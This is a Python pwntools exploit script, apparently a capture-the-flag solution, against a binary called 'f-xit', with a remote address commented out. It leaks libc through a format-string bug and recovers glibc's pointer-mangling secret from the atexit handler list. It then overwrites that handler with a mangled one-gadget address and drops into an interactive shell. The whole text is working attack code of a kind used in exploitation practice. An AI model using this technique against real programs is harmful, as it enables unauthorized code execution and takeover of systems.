from pwn import *
context.update(os="linux", arch="amd64", log_level="debug")
#p = remote("20.199.64.76",1337)
p = process("./f-xit")
elf = ELF("./f-xit")
libc = elf.libc
ld = ELF("glibc/ld-linux-x86-64.so.2")
p.sendline("%41$p")
leak = int(p.recvline(), 16) - 0x29d90
print(hex(leak))
att = leak + 0x21af00#libc.sym.__cxa_atexit
#print(ld.sym._dl_fini)
print(hex(att))#0x236040
dl_fini =  leak  + 0x236040
print(hex(dl_fini))
gdb.attach(p, gdbscript = """
           break *main + 133
""")
ror17 = lambda x : ((x << 47) & (2**64 - 1)) | (x >> 17)
p.sendline(b"%7$sAAAA"+p64(att + 24))
leak1 = u64(p.recv(8).ljust(8, b"\x00"))
print(hex(leak1))
att_secret = ror17(leak1) ^ dl_fini
rol17 = lambda x : ((x << 17) & (2**64 - 1)) | (x >> 47)
atexit_mangle = lambda addr : rol17(addr ^ att_secret)
one = leak + 0x50a37
print(hex(one))
#gdb.attach(p, gdbscript = """
#           break *""" + str(one))
write = {att + 24: atexit_mangle(one)}
write2 = {att + 24 : 0xdeadbeef}
payload = fmtstr_payload(6, write)
p.sendline(payload)
#gdb.attach(p)
p.interactive()
